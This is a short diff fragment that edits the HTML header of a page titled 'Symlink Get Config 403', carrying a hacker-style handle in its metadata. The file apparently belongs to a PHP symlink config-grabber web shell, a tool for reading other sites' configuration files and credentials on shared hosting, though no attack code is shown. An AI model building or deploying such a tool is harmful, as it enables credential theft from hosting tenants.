@@ -1,4 +1,4 @@
-?><html>
+<html>
 <head>
 <title>Symlink Get Config 403</title>
 <meta property="og:title" content="$ Achon666ju5t $"/>      <meta property="og:description" content="./ 403"/>
